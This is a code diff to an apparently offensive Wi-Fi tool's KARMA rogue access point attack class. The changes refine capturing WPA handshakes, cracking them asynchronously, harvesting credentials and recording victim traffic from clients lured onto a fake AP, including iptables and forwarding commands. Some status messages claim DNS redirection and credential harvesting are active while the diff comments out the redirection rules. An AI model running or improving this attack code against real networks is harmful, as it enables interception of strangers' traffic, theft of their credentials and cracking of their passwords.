@@ -1303,9 +1303,9 @@ class AttackKARMA(Attack):
             # Phase 3: DNS Spoofing Setup (if enabled)
             Color.pl('\n{+} {C}Phase 3: DNS Spoofing Setup{W}')
             if Configuration.karma_dns_spoofing:
-                Color.pl('{+} {G}DNS spoofing enabled - setting up DNS server{W}')
-                Color.pl('{!} {O}DNS spoofing functionality not yet implemented{W}')
-                Color.pl('{!} {O}Continuing with Layer 2 KARMA attack only{W}')
+                Color.pl('{+} {G}DNS spoofing enabled - DNS redirection is active{W}')
+                Color.pl('{+} {C}All victim DNS queries will be redirected to rogue web server{W}')
+                Color.pl('{+} {C}This enables credential harvesting from HTTP/HTTPS traffic{W}')
             else:
                 Color.pl('{+} {O}DNS spoofing disabled - running Layer 2 KARMA only{W}')
             
@@ -1323,14 +1323,22 @@ class AttackKARMA(Attack):
             self.start_handshake_capture()
             
             # Stage 5.5: Start Web Server for Credential Harvesting (if enabled)
-            if getattr(Configuration, 'karma_credential_harvesting', False):
-                if hasattr(self, 'target') and self.target:
-                    Color.pattack('KARMA', self.target, 'Stage 5.5', 'Starting credential harvesting web server')
-                self.start_credential_harvesting_server()
+            # DISABLED: Web interface at 10.0.0.1 removed
+            # if getattr(Configuration, 'karma_credential_harvesting', False):
+            #     if hasattr(self, 'target') and self.target:
+            #         Color.pattack('KARMA', self.target, 'Stage 5.5', 'Starting credential harvesting web server')
+            #     self.start_credential_harvesting_server()
             
             # Stage 6: Complete Monitoring & Analysis
             if hasattr(self, 'target') and self.target:
                 Color.pattack('KARMA', self.target, 'Stage 6', 'Full monitoring active')
+            
+            # Show capture directories info
+            Color.pl('\n{+} {C}Capture Directories:{W}')
+            Color.pl('  {G}Credentials:{W} {C}%s{W}' % Configuration.karma_credentials_dir)
+            Color.pl('  {G}Handshakes:{W} {C}%s{W}' % Configuration.karma_handshakes_dir)
+            Color.pl('  {G}Traffic:{W} {C}%s{W}' % Configuration.karma_traffic_dir)
+            Color.pl('  {G}Live Monitoring:{W} {C}%s{W}' % os.path.join(Configuration.karma_captures_dir, 'live_monitoring'))
             
             if self.single_interface_mode:
                 self.start_monitoring()
@@ -2047,8 +2055,8 @@ class AttackKARMA(Attack):
     
     def start_handshake_capture(self):
         """Start handshake capture for WPA/WPA2 networks"""
-        # Check if handshake cracking is enabled
-        if not getattr(Configuration, 'karma_handshake_cracking', False):
+        # Check if handshake capture is enabled
+        if not getattr(Configuration, 'karma_handshake_capture', True):
             Color.pl('{+} {C}Handshake capture disabled in configuration{W}')
             return False
             
@@ -2531,10 +2539,11 @@ class AttackKARMA(Attack):
             Color.pl('{+} {C}Targeting AP {G}%s{W} on channel {G}%s{W} for client {G}%s{W}' % (ap_bssid, ap_channel or 'auto', client_mac))
             
             # Use safe interface operation for airodump
+            # FIXED: Capture on rogue interface to capture handshakes from clients connected to our fake AP
             def capture_operation():
-                with Airodump(interface=self.probe_interface,
-                             target_bssid=ap_bssid,  # FIXED: Use AP BSSID, not client MAC
-                             channel=ap_channel,  # FIXED: Add channel for better reliability
+                with Airodump(interface=self.rogue_interface,  # Capture on rogue interface where clients connect
+                             target_bssid=None,  # Capture all traffic to get handshakes from our rogue AP
+                             channel=ap_channel,
                              output_file_prefix='karma_handshake_%s' % client_mac.replace(':', ''),
                              delete_existing_files=True) as airodump:
                     
@@ -2568,14 +2577,41 @@ class AttackKARMA(Attack):
                                 # Use Handshake class for validation (same as WPA)
                                 try:
                                     from ..model.handshake import Handshake
-                                    handshake = Handshake(capfile=cap_file, bssid=ap_bssid)
+                                    
+                                    # Get rogue AP BSSID for handshake validation
+                                    rogue_ap_bssid = None
+                                    # Try to get it from interface  
+                                    if self.rogue_interface:
+                                        try:
+                                            import subprocess
+                                            rogue_iface = self.rogue_interface
+                                            result = subprocess.run(['ip', 'link', 'show', rogue_iface],
+                                                                    capture_output=True, text=True, timeout=2)
+                                            if 'ether' in result.stdout:
+                                                for line in result.stdout.split('\n'):
+                                                    if 'ether' in line:
+                                                        parts = line.split()
+                                                        for i, part in enumerate(parts):
+                                                            if part == 'ether' and i + 1 < len(parts):
+                                                                rogue_ap_bssid = parts[i + 1].lower()
+                                                                break
+                                        except:
+                                            pass
+                                    
+                                    # Use rogue AP BSSID or fallback to original AP BSSID
+                                    handshake_bssid = rogue_ap_bssid or ap_bssid
+                                    
+                                    if Configuration.verbose > 1:
+                                        Color.pl('{+} {C}Checking for handshake with BSSID: {G}%s{W}' % handshake_bssid)
+                                    
+                                    handshake = Handshake(capfile=cap_file, bssid=handshake_bssid)
                                     if handshake.has_handshake():
                                         self.captured_handshakes[client_mac] = cap_file
                                         Color.pl('{+} {G}WPA handshake captured from {C}%s{W}!' % client_mac)
                                         handshake_found = True
                                         
-                                        # Save handshake to permanent directory
-                                        self.save_karma_handshake(cap_file, client_mac, ap_bssid)
+                                        # Save handshake to permanent directory using rogue AP BSSID
+                                        self.save_karma_handshake(cap_file, client_mac, handshake_bssid)
                                         
                                         # Attempt to crack the handshake asynchronously
                                         self.crack_handshake_async(client_mac, cap_file)
@@ -2787,6 +2823,29 @@ class AttackKARMA(Attack):
                                         (client_mac, network.bssid))
                                 return network.bssid
             
+            # KARMA: If client is connected to rogue AP, use rogue AP BSSID
+            # This allows capturing handshakes from clients connecting to our fake AP
+            if hasattr(self, 'rogue_ap_process') and self.rogue_ap_process and self.rogue_interface:
+                # Try to get the rogue AP BSSID from hostapd
+                try:
+                    rogue_iface = self.rogue_interface  # Store in local variable for type safety
+                    result = subprocess.run(['ip', 'link', 'show', rogue_iface], 
+                                          capture_output=True, text=True, timeout=3)
+                    if result.returncode == 0 and 'ether' in result.stdout:
+                        # Extract MAC address from ip link output
+                        for line in result.stdout.split('\n'):
+                            if 'ether' in line:
+                                parts = line.split()
+                                for i, part in enumerate(parts):
+                                    if part == 'ether' and i + 1 < len(parts):
+                                        rogue_bssid = parts[i + 1]
+                                        Color.pl('{+} {C}Using rogue AP BSSID {G}%s{W} for client {G}%s{W}' % 
+                                                (rogue_bssid, client_mac))
+                                        return rogue_bssid
+                except Exception as e:
+                    if Configuration.verbose > 1:
+                        Color.pl('{!} {O}Could not get rogue AP BSSID: {O}%s{W}' % str(e))
+            
             # Last resort: scan for APs with this client
             ap_bssid = self.scan_for_ap_with_client(client_mac)
             if ap_bssid:
@@ -2877,9 +2936,9 @@ class AttackKARMA(Attack):
     
     def crack_handshake_async(self, client_mac, handshake_file):
         """Attempt to crack captured WPA handshake asynchronously"""
-        # Check if handshake cracking is enabled
+        # Check if handshake cracking is enabled (separate from capture)
         if not getattr(Configuration, 'karma_handshake_cracking', False):
-            Color.pl('{+} {C}Handshake cracking disabled - skipping password attempt{W}')
+            Color.pl('{+} {C}Handshake cracking disabled - skipping password attempt (capture only){W}')
             return
             
         try:
@@ -3060,6 +3119,13 @@ class AttackKARMA(Attack):
     
     def monitor_credential_harvesting(self):
         try:
+            # Check if credential harvesting is enabled
+            if not getattr(Configuration, 'karma_credential_harvesting', True):
+                Color.pl('{!} {O}Credential harvesting disabled in configuration{W}')
+                return
+            
+            Color.pl('{+} {C}Credential harvesting monitor started{W}')
+            
             while self.running:
                 if self.connected_clients:
                     for client_mac in self.connected_clients:
@@ -3077,9 +3143,10 @@ class AttackKARMA(Attack):
         try:
             Color.pl('{+} {C}Harvesting credentials from {G}%s{W}...' % client_mac)
             
-            # Capture traffic from this client
-            with Airodump(interface=self.probe_interface,
-                         target_bssid=client_mac,
+            # FIXED: Capture on the rogue interface (where AP traffic flows) without BSSID filter
+            # This captures all traffic on the AP interface, including data frames for credential harvesting
+            with Airodump(interface=self.rogue_interface,
+                         target_bssid=None,  # Capture all traffic, not filtered by BSSID
                          output_file_prefix='karma_credentials_%s' % client_mac.replace(':', ''),
                          delete_existing_files=True) as airodump:
                 
@@ -3118,6 +3185,12 @@ class AttackKARMA(Attack):
     def capture_client_traffic(self, client_mac):
         """Capture general traffic from a connected client"""
         try:
+            # Check if traffic capture is enabled
+            if not getattr(Configuration, 'karma_traffic_capture', True):
+                if Configuration.verbose > 1:
+                    Color.pl('{!} {O}Traffic capture disabled in configuration{W}')
+                return
+            
             Color.pl('{+} {C}Capturing traffic from {G}%s{W}...' % client_mac)
             
             # FIXED: Capture on the rogue interface (where AP traffic flows) without BSSID filter
@@ -3344,8 +3417,8 @@ class AttackKARMA(Attack):
             
             Color.pl('{+} {G}Starting live monitoring on interface {C}%s{W}...' % monitor_interface)
             
-            # Create live monitoring directory
-            live_dir = os.path.join(Configuration.karma_captures_dir, 'live_monitoring')
+            # Use configured live monitoring directory
+            live_dir = Configuration.karma_live_monitoring_dir
             if not os.path.exists(live_dir):
                 os.makedirs(live_dir, exist_ok=True)
             
@@ -4177,11 +4250,12 @@ server=8.8.8.8
                 pass
             
             # Setup iptables rules for traffic redirection
+            # DISABLED: Web interface at 10.0.0.1 removed - no DNAT rules
             commands = [
                 f'ifconfig {self.rogue_interface} 10.0.0.1/24 up',
                 'echo "1" > /proc/sys/net/ipv4/ip_forward',
-                f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80',
-                f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80',
+                # f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80',
+                # f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80',
                 f'iptables -A FORWARD -i {self.rogue_interface} -j ACCEPT'
             ]
             
@@ -4242,9 +4316,9 @@ server=8.8.8.8
                 # NAT for internet access
                 f'iptables -t nat -A POSTROUTING -o {internet_interface} -j MASQUERADE',
                 
-                # Keep existing DNS spoofing rules for credential harvesting
-                f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80',
-                f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80'
+                # DISABLED: Web interface at 10.0.0.1 removed - no DNAT rules
+                # f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80',
+                # f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80'
             ]
             
             failed_commands = []
@@ -6326,7 +6400,8 @@ def application(environ, start_response):
             Configuration.karma_probes_dir,
             Configuration.karma_handshakes_dir,
             Configuration.karma_credentials_dir,
-            Configuration.karma_traffic_dir
+            Configuration.karma_traffic_dir,
+            Configuration.karma_live_monitoring_dir
         ]
         
         for directory in directories:
@@ -6412,7 +6487,7 @@ def application(environ, start_response):
                 # Verify the copied file is accessible
                 if os.path.exists(save_path) and os.access(save_path, os.R_OK):
                     file_size = os.path.getsize(save_path)
-                    Color.pl('{+} {G}KARMA handshake saved to: {C}%s{W} ({G}%d bytes{W})' % (save_path, file_size))
+                    Color.pl('{+} {G}✓ KARMA handshake saved to: {C}%s{W} ({G}%d bytes{W})' % (save_path, file_size))
                     return save_path
                 else:
                     Color.pl('{!} {R}Error: Copied handshake file is not accessible{W}')
@@ -6454,8 +6529,8 @@ def application(environ, start_response):
                 for cred in credentials:
                     f.write(f"- {cred}\n")
             
-            Color.pl('{+} {G}Credential data saved to: {C}%s{W}' % save_path)
-            Color.pl('{+} {G}Credentials list saved to: {C}%s{W}' % creds_file)
+            Color.pl('{+} {G}✓ Credential data saved to: {C}%s{W}' % save_path)
+            Color.pl('{+} {G}✓ Credentials list saved to: {C}%s{W}' % creds_file)
             return save_path
             
         except Exception as e:
@@ -6488,7 +6563,7 @@ def application(environ, start_response):
                 # Verify the copied file is accessible
                 if os.path.exists(save_path) and os.access(save_path, os.R_OK):
                     file_size = os.path.getsize(save_path)
-                    Color.pl('{+} {G}Traffic capture saved to: {C}%s{W} ({G}%d bytes{W})' % (save_path, file_size))
+                    Color.pl('{+} {G}✓ Traffic capture saved to: {C}%s{W} ({G}%d bytes{W})' % (save_path, file_size))
                     return save_path
                 else:
                     Color.pl('{!} {R}Error: Copied file is not accessible{W}')
